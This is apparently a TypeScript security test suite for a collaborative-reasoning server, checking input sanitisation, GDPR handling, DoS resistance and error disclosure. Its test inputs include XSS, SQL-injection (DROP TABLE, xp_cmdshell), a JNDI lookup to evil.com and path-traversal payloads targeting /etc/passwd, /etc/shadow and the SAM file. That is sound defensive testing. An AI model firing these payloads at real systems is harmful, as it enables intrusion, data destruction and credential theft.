/**
 * Security compliance tests based on SECURITY.md requirements
 * Tests enterprise security standards and GDPR compliance
 */

import { describe, test, expect, beforeEach } from "bun:test";
import { CollaborativeReasoningServer } from "../../index.js";
import { mockCollaborativeReasoningData, TestHelpers } from "../utils/test-data.js";

/**
 * Robust security validators for sensitive data detection
 */
class SecurityValidators {
  // Robust email pattern (RFC-5322 inspired, simplified for practical use)
  static emailPattern =
    /\b[a-zA-Z0-9.!#$%&'*+=?^_`{|}~-]+@[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?(?:\.[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?)*\b/iu;

  // E.164 aware phone pattern with common formats
  static phonePattern =
    /(?:\+?1[-\s.]?)?(?:\(?[0-9]{3}\)?[-\s.]?[0-9]{3}[-\s.]?[0-9]{4})|(?:\+[1-9]\d{1,14})|(?:\(?\d{3}\)?[-\s.]?\d{3}[-\s.]?\d{4})/g;

  // Canonical US SSN pattern with valid ranges (area 001-899 excluding 666, group 01-99, serial 0001-9999)
  // Optimized to prevent ReDoS attacks by eliminating overlapping alternation and nested quantifiers
  static ssnPattern =
    /\b(?:00[1-9]|0[1-9]\d|[1-5]\d{2}|6[0-5]\d|66[0-57-9]|7[0-6]\d|77[0-2]|8\d{2})[-\s]?(?:0[1-9]|[1-9]\d)[-\s]?(?:000[1-9]|00[1-9]\d|0[1-9]\d{2}|[1-9]\d{3})\b/iu;

  /**
   * Validates credit card numbers using Luhn algorithm and common BIN ranges
   */
  static validateCreditCard(text: string): boolean {
    // Enhanced credit card pattern matching 13-19 digits with optional separators
    // Find 13–19 digits allowing single space/hyphen separators, without catastrophic backtracking
    const cardPattern = /(?<!\d)(?:\d[ -]?){12,18}\d(?!\d)/g;
    const matches = text.match(cardPattern);

    if (!matches) return false;

    // Check each potential card number with Luhn algorithm
    return matches.some((card) => {
      const digits = card.replace(/\D/g, "");
      return digits.length >= 13 && digits.length <= 19 && this.luhnCheck(digits);
    });
  }

  /**
   * Luhn algorithm implementation for credit card validation
   */
  private static luhnCheck(cardNumber: string): boolean {
    let sum = 0;
    let alternate = false;

    for (let i = cardNumber.length - 1; i >= 0; i--) {
      let n = parseInt(cardNumber.charAt(i), 10);

      if (alternate) {
        n *= 2;
        if (n > 9) {
          n = (n % 10) + 1;
        }
      }

      sum += n;
      alternate = !alternate;
    }

    return sum % 10 === 0;
  }
}

describe("Security Compliance Tests", () => {
  let collaborativeReasoningServer: CollaborativeReasoningServer;

  beforeEach(() => {
    collaborativeReasoningServer = new CollaborativeReasoningServer();
  });

  describe("Input Validation and Sanitization", () => {
    test("should reject malicious script injection attempts", () => {
      const maliciousInputs = [
        '<script>alert("xss")</script>',
        'javascript:alert("xss")',
        "${jndi:ldap://evil.com/a}",
        "{{7*7}}",
        "<%=7*7%>",
        "#{7*7}",
        "${7*7}",
        'eval("alert(1)")',
        "document.cookie",
        "window.location"
      ];

      maliciousInputs.forEach((maliciousInput) => {
        const testData = TestHelpers.cloneTestData(mockCollaborativeReasoningData);
        testData.topic = maliciousInput;
        testData.contributions[0]!.content = maliciousInput;
        testData.personas[0]!.name = maliciousInput;

        const result = collaborativeReasoningServer.processCollaborativeReasoning(testData);

        // Should either reject the input or sanitize it
        if (!result.isError && result.content?.[0]) {
          // If processed, ensure no script execution context
          expect(result.content[0]?.text).not.toContain("<script>");
          expect(result.content[0]?.text).not.toContain("javascript:");
          expect(result.content[0]?.text).not.toContain("eval(");
        }
      });
    });

    test("should handle SQL injection attempts safely", () => {
      const sqlInjectionAttempts = [
        "'; DROP TABLE users; --",
        "' OR '1'='1",
        "' UNION SELECT * FROM users --",
        "'; INSERT INTO users VALUES ('hacker', 'password'); --",
        "' OR 1=1 --",
        "admin'--",
        "admin'/*",
        "' OR 'x'='x",
        "'; EXEC xp_cmdshell('dir'); --"
      ];

      sqlInjectionAttempts.forEach((injection) => {
        const testData = TestHelpers.cloneTestData(mockCollaborativeReasoningData);
        testData.topic = injection;
        testData.sessionId = injection;
        testData.activePersonaId = injection;

        const result = collaborativeReasoningServer.processCollaborativeReasoning(testData);

        // Should handle safely without database errors
        expect(result).toBeDefined();
        if (!result.isError && result.content?.[0]) {
          expect(result.content[0]?.text).not.toContain("DROP TABLE");
          expect(result.content[0]?.text).not.toContain("UNION SELECT");
          expect(result.content[0]?.text).not.toContain("EXEC xp_cmdshell");
        }
      });
    });

    test("should validate and sanitize file path inputs", () => {
      const pathTraversalAttempts = [
        "../../../etc/passwd",
        "..\\..\\..\\windows\\system32\\config\\sam",
        "/etc/shadow",
        "C:\\Windows\\System32\\drivers\\etc\\hosts",
        "....//....//....//etc/passwd",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "..%252f..%252f..%252fetc%252fpasswd",
        "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd"
      ];

      pathTraversalAttempts.forEach((path) => {
        const testData = TestHelpers.cloneTestData(mockCollaborativeReasoningData);
        testData.sessionId = path;
        testData.personas[0]!.background = path;

        const result = collaborativeReasoningServer.processCollaborativeReasoning(testData);

        // Should handle path traversal attempts safely
        expect(result).toBeDefined();
        if (!result.isError && result.content?.[0]) {
          expect(result.content[0]?.text).not.toContain("/etc/passwd");
          expect(result.content[0]?.text).not.toContain("system32");
        }
      });
    });

    test("should enforce input length limits", () => {
      const testData = TestHelpers.cloneTestData(mockCollaborativeReasoningData);

      // Test extremely long inputs
      const longString = "A".repeat(100000);
      testData.topic = longString;
      testData.contributions[0]!.content = longString;
      testData.personas[0]!.background = longString;

      const result = collaborativeReasoningServer.processCollaborativeReasoning(testData);

      // Should either reject or truncate extremely long inputs
      expect(result).toBeDefined();
      if (!result.isError && result.content?.[0]) {
        // Response should be reasonable length
        expect(result.content[0]?.text.length).toBeLessThan(50000);
      }
    });

    test("should validate data types strictly", () => {
      const invalidTypeInputs = [
        { topic: 123, field: "topic" },
        { personas: "not-an-array", field: "personas" },
        { contributions: null, field: "contributions" },
        { stage: 123, field: "stage" },
        { iteration: "not-a-number", field: "iteration" },
        { nextContributionNeeded: "not-a-boolean", field: "nextContributionNeeded" }
      ];

      invalidTypeInputs.forEach(
        ({ topic, personas, contributions, stage, iteration, nextContributionNeeded, field }) => {
          const modifiedData = TestHelpers.cloneTestData(mockCollaborativeReasoningData) as unknown as Record<
            string,
            unknown
          >;

          if (topic !== undefined) modifiedData["topic"] = topic;
          if (personas !== undefined) modifiedData["personas"] = personas;
          if (contributions !== undefined) modifiedData["contributions"] = contributions;
          if (stage !== undefined) modifiedData["stage"] = stage;
          if (iteration !== undefined) modifiedData["iteration"] = iteration;
          if (nextContributionNeeded !== undefined) modifiedData["nextContributionNeeded"] = nextContributionNeeded;

          const result = collaborativeReasoningServer.processCollaborativeReasoning(modifiedData as never);

          // Should reject invalid types
          expect(result.isError).toBe(true);
          if (result.content?.[0]) {
            expect(result.content[0]?.text.toLowerCase()).toContain(field.toLowerCase());
          }
        }
      );
    });
  });

  describe("GDPR Compliance", () => {
    test("should not log or expose sensitive personal data", () => {
      const sensitiveData = {
        email: "user@example.com",
        phone: "+49-123-456-7890",
        address: "Musterstraße 123, 12345 Berlin",
        ssn: "123-45-6789",
        creditCard: "4111-1111-1111-1111",
        iban: "DE89 3704 0044 0532 0130 00"
      };

      const testData = TestHelpers.cloneTestData(mockCollaborativeReasoningData);
      testData.topic = `Discussion about ${sensitiveData.email} and ${sensitiveData.phone}`;
      testData.contributions[0]!.content = `Contact at ${sensitiveData.address} or ${sensitiveData.creditCard}`;
      testData.personas[0]!.background = `Person with SSN ${sensitiveData.ssn} and IBAN ${sensitiveData.iban}`;

      const result = collaborativeReasoningServer.processCollaborativeReasoning(testData);

      if (!result.isError && result.content?.[0]) {
        const responseText = result.content[0]?.text.toLowerCase() || "";

        // Should not expose sensitive data patterns using robust validation
        expect(responseText).not.toMatch(SecurityValidators.emailPattern); // RFC-5322 compliant email
        expect(responseText).not.toMatch(SecurityValidators.phonePattern); // E.164 aware phone
        expect(responseText).not.toMatch(SecurityValidators.ssnPattern); // Enhanced SSN with delimiters
        expect(SecurityValidators.validateCreditCard(responseText)).toBe(false); // Luhn-validated credit card
      }
    });

    test("should handle data minimization principles", () => {
      const testData = TestHelpers.cloneTestData(mockCollaborativeReasoningData);

      // Add excessive personal details
      testData.personas[0]!.background =
        "Born on 1985-03-15, lives at Hauptstraße 42, Berlin, works at TechCorp GmbH, salary €75000, married to Anna Schmidt, has 2 children aged 8 and 12";
      testData.personas[0]!.perspective =
        "As someone with diabetes type 2, high blood pressure, and anxiety disorder, I believe...";

      const result = collaborativeReasoningServer.processCollaborativeReasoning(testData);

      if (!result.isError && result.content?.[0]) {
        const responseText = result.content[0]?.text || "";

        // Should focus on relevant professional aspects, not personal details
        expect(responseText).not.toContain("1985-03-15");
        expect(responseText).not.toContain("Hauptstraße 42");
        expect(responseText).not.toContain("€75000");
        expect(responseText).not.toContain("Anna Schmidt");
        expect(responseText).not.toContain("diabetes");
        expect(responseText).not.toContain("blood pressure");
      }
    });

    test("should respect data retention policies", () => {
      const oldSessionId = "session-from-2020-01-01";
      const retentionTestData = TestHelpers.cloneTestData(mockCollaborativeReasoningData);
      retentionTestData.sessionId = oldSessionId;

      const result = collaborativeReasoningServer.processCollaborativeReasoning(retentionTestData);

      // Should process without retaining old session data
      expect(result).toBeDefined();
      if (!result.isError) {
        // Verify no persistent storage of old sessions
        expect(result.content).toBeDefined();
      }
    });
  });

  describe("Rate Limiting and DoS Protection", () => {
    test("should handle rapid successive requests", () => {
      const testData = TestHelpers.createMinimalValidData();
      const results = [];
      const startTime = Date.now();

      // Make 20 rapid requests
      for (let i = 0; i < 20; i++) {
        const data = TestHelpers.cloneTestData(testData);
        data.sessionId = `rapid-session-${i}`;

        const result = collaborativeReasoningServer.processCollaborativeReasoning(data);
        results.push(result);
      }

      const endTime = Date.now();
      const totalTime = endTime - startTime;

      // Should handle all requests within reasonable time
      expect(totalTime).toBeLessThan(5000); // 5 seconds max

      // All requests should be processed (no rate limiting errors)
      results.forEach((result) => {
        expect(result).toBeDefined();
      });
    });

    test("should handle large payload attacks", () => {
      const testData = TestHelpers.cloneTestData(mockCollaborativeReasoningData);

      // Create extremely large dataset
      const PERSONAS = process.env['CI'] ? 200 : 1000;
      testData.personas = Array.from({ length: PERSONAS }, (_, i) => ({
        id: `persona-${i}`,
        name: `Test Persona ${i}`,
        expertise: Array.from({ length: 100 }, (_, j) => `skill-${i}-${j}`),
        background: "A".repeat(10000),
        perspective: "B".repeat(10000),
        biases: Array.from({ length: 50 }, (_, j) => `bias-${i}-${j}`),
        communication: {
          style: "analytical",
          tone: "professional"
        }
      }));

      const CONTRIBUTIONS = process.env['CI'] ? 1000 : 5000;
      testData.contributions = Array.from({ length: CONTRIBUTIONS }, (_, i) => ({
        personaId: `persona-${i % PERSONAS}`,
        content: "C".repeat(5000),
        type: "insight",
        confidence: 0.8
      }));

      const startTime = Date.now();
      const result = collaborativeReasoningServer.processCollaborativeReasoning(testData);
      const endTime = Date.now();

      // Should either reject large payloads or handle them efficiently
      expect(result).toBeDefined();
      expect(endTime - startTime).toBeLessThan(10000); // 10 seconds max

      if (result.isError) {
        // Should provide meaningful error for oversized payload
        expect(result.content).toBeDefined();
        if (result.content && result.content[0]) {
          expect(result.content[0].text.toLowerCase()).toMatch(/size|limit|large|payload/);
        }
      }
    });

    test("should prevent memory exhaustion attacks", () => {
      const testData = TestHelpers.cloneTestData(mockCollaborativeReasoningData);

      // Create deeply nested or circular reference attempts
      const deepObject = { level: 0, next: null as Record<string, unknown> | null };
      let current = deepObject;

      for (let i = 1; i < 1000; i++) {
        current.next = { level: i, next: null as Record<string, unknown> | null };
        current = current.next as { level: number; next: Record<string, unknown> | null };
      }

      // Try to inject deep object
      (testData as unknown as Record<string, unknown>)["deepNesting"] = deepObject;

      const result = collaborativeReasoningServer.processCollaborativeReasoning(testData);

      // Should handle without memory issues
      expect(result).toBeDefined();
    });
  });

  describe("Error Information Disclosure", () => {
    test("should not expose internal system information in errors", () => {
      // Cause various types of errors
      const errorCases = [
        null,
        undefined,
        {},
        { topic: null },
        { topic: "test", personas: null },
        { topic: "test", personas: [], contributions: "invalid" }
      ];

      errorCases.forEach((errorCase) => {
        const result = collaborativeReasoningServer.processCollaborativeReasoning(errorCase as never);

        if (result.isError && result.content?.[0]) {
          const errorText = result.content[0]?.text.toLowerCase() || "";

          // Should not expose sensitive system information
          expect(errorText).not.toContain("stack trace");
          expect(errorText).not.toContain("file path");
          expect(errorText).not.toContain("/users/");
          expect(errorText).not.toContain("c:\\");
          expect(errorText).not.toContain("node_modules");
          expect(errorText).not.toContain("internal error");
          expect(errorText).not.toContain("database");
          expect(errorText).not.toContain("connection string");
          expect(errorText).not.toContain("password");
          expect(errorText).not.toContain("secret");
          expect(errorText).not.toContain("token");
          expect(errorText).not.toContain("api key");
        }
      });
    });

    test("should provide user-friendly error messages", () => {
      const testData = TestHelpers.cloneTestData(mockCollaborativeReasoningData);
      delete (testData as unknown as Record<string, unknown>)["topic"];

      const result = collaborativeReasoningServer.processCollaborativeReasoning(testData);

      expect(result.isError).toBe(true);
      if (result.content && result.content[0]) {
        const errorText = result.content[0].text;

        // Should provide helpful, non-technical error messages
        expect(errorText.length).toBeGreaterThan(10);
        expect(errorText.length).toBeLessThan(500);
        expect(errorText).toMatch(/topic|required|missing|invalid/i);
      }
    });
  });

  describe("Audit and Logging Security", () => {
    test("should not log sensitive data in processing", () => {
      const testData = TestHelpers.cloneTestData(mockCollaborativeReasoningData);
      testData.topic = "Discussion about password123 and secret-token-abc";
      testData.contributions[0]!.content = "The API key is sk-1234567890abcdef";

      const result = collaborativeReasoningServer.processCollaborativeReasoning(testData);

      // Processing should complete without exposing sensitive data
      expect(result).toBeDefined();
      if (!result.isError && result.content && result.content[0]) {
        expect(result.content[0].text).not.toContain("password123");
        expect(result.content[0].text).not.toContain("secret-token-abc");
        expect(result.content[0].text).not.toContain("sk-1234567890abcdef");
      }
    });

    test("should handle session tracking securely", () => {
      const sessionIds = ["session-123", "user-456-session", "admin-session-789", "test-session-with-sensitive-data"];

      sessionIds.forEach((sessionId) => {
        const testData = TestHelpers.cloneTestData(mockCollaborativeReasoningData);
        testData.sessionId = sessionId;

        const result = collaborativeReasoningServer.processCollaborativeReasoning(testData);

        // Should process without exposing session information
        expect(result).toBeDefined();
        if (!result.isError && result.content && result.content[0]) {
          expect(result.content[0].text).not.toContain(sessionId);
        }
      });
    });
  });
});
